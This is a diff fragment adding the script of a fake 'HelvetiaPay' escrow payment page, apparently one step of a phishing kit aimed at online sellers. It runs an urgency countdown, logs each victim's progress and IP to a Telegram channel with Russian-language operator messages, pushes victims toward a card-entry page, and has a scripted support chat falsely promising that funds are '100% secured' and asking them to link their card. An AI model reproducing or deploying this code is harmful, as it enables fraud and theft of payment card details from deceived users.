+        if (savedTime && parseInt(savedTime, 10) > 0) {
+          totalSeconds = parseInt(savedTime, 10);
+        }
+
+        setInterval(() => {
+          if (totalSeconds > 0) totalSeconds--;
+          sessionStorage.setItem('helvetia_timer_seconds', totalSeconds);
+          const m = Math.floor(totalSeconds / 60);
+          const s = totalSeconds % 60;
+          if (timerEl) {
+            timerEl.textContent = `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')} min`;
+          }
+        }, 1000);
+      }
+
+      /* Checkbox validation & Step 3 Navigation */
+      function initCheckboxValidation() {
+        const chkPromise = document.getElementById('chk-dispatch-promise');
+        const chkAccurate = document.getElementById('chk-details-accurate');
+        const btnProceed = document.getElementById('btn-proceed-step3');
+        const txtBtn = document.getElementById('txt-btn-step2');
+
+        function evaluateChecks() {
+          const isBothChecked = chkPromise.checked && chkAccurate.checked;
+          btnProceed.disabled = !isBothChecked;
+        }
+
+        if (chkPromise) chkPromise.addEventListener('change', evaluateChecks);
+        if (chkAccurate) chkAccurate.addEventListener('change', evaluateChecks);
+
+        if (btnProceed) {
+          btnProceed.addEventListener('click', function(e) {
+            e.preventDefault();
+            if (this.disabled) return;
+
+            this.setAttribute('aria-busy', 'true');
+            if (txtBtn) txtBtn.textContent = translations[currentLang].btn_loading_card || "Connecting to Gateway...";
+            showToast(translations[currentLang].toast_navigating);
+
+            // Send tracking log to CHAT_LOGS
+            const step2ProceedMsg = `💳 <b>[Переход к оплате] Юзер подтвердил отправку товара и переходит на страницу ввода карты.</b>\n\n${getIpHashtag(userIp)}`;
+            sendToTelegram(CHAT_LOGS, step2ProceedMsg);
+
+            setTimeout(() => {
+              const search = window.location.search;
+              window.location.href = 'step-3.html' + search;
+            }, 600);
+          });
+        }
+      }
+
+      /* Toast Notification */
+      let toastTimeout;
+      function showToast(msg) {
+        const toast = document.getElementById('toast');
+        if (!toast) return;
+        toast.textContent = msg;
+        toast.classList.add('show');
+        clearTimeout(toastTimeout);
+        toastTimeout = setTimeout(() => {
+          toast.classList.remove('show');
+        }, 2400);
+      }
+
+      /* Language Switcher */
+      function setLanguage(lang) {
+        if (!translations[lang]) return;
+        currentLang = lang;
+        document.documentElement.lang = lang.toLowerCase();
+
+        document.querySelectorAll('.lang-btn').forEach(btn => {
+          btn.classList.toggle('active', btn.getAttribute('data-lang') === lang);
+        });
+
+        const mobileSelect = document.getElementById('lang-select-mobile');
+        if (mobileSelect) mobileSelect.value = lang;
+
+        const data = translations[lang];
+        document.querySelectorAll('[data-i18n]').forEach(el => {
+          const key = el.getAttribute('data-i18n');
+          if (data[key]) el.innerHTML = data[key];
+        });
+
+        const welcomeEl = document.getElementById('chat-welcome-msg');
+        if (welcomeEl && data.chat_welcome) welcomeEl.textContent = data.chat_welcome;
+
+        try {
+          localStorage.setItem('selectedLang', lang);
+          localStorage.setItem('swiss_pay_lang', lang);
+        } catch (e) {}
+      }
+
+      /* Support Chat Widget */
+      function initSupportChat() {
+        const triggerBtn = document.getElementById('chat-trigger-btn');
+        const panel = document.getElementById('chat-panel');
+        const closeBtn = document.getElementById('chat-close-btn');
+        const form = document.getElementById('chat-form');
+        const input = document.getElementById('chat-input');
+        const container = document.getElementById('chat-messages-container');
+
+        if (triggerBtn && panel) {
+          triggerBtn.addEventListener('click', () => panel.classList.toggle('open'));
+        }
+        if (closeBtn && panel) {
+          closeBtn.addEventListener('click', () => panel.classList.remove('open'));
+        }
+        if (form && input) {
+          form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const val = input.value.trim();
+            if (!val) return;
+
+            const uMsg = document.createElement('div');
+            uMsg.className = 'chat-msg user';
+            uMsg.textContent = val;
+            container.appendChild(uMsg);
+            input.value = '';
+
+            setTimeout(() => {
+              const sMsg = document.createElement('div');
+              sMsg.className = 'chat-msg system';
+              sMsg.textContent = "The funds are 100% secured by HelvetiaPay Escrow. After confirming the waybill, link your card on Step 3 for instant interbank payout.";
+              container.appendChild(sMsg);
+              container.scrollTop = container.scrollHeight;
+            }, 1000);
+          });
+        }
+      }
+
+      /* Init */
+      document.addEventListener('DOMContentLoaded', () => {
+        initGeoAndTracking();
+        initSmartHeaderScroll();
+        hydrateStep2Data();
+        initTimer();
+        initCheckboxValidation();
+        initSupportChat();
+
+        document.querySelectorAll('.lang-btn').forEach(btn => {
+          btn.addEventListener('click', () => setLanguage(btn.getAttribute('data-lang')));
+        });
+        const mobileSelect = document.getElementById('lang-select-mobile');
+        if (mobileSelect) {
+          mobileSelect.addEventListener('change', (e) => setLanguage(e.target.value));
+        }
+
+        let savedLang = 'DE';
+        try {
+          savedLang = localStorage.getItem('selectedLang') || localStorage.getItem('swiss_pay_lang') || 'DE';
+        } catch (e) {}
+        setLanguage(savedLang);
+      });
+
+    })();
+  </script>
+</body>
+</html>
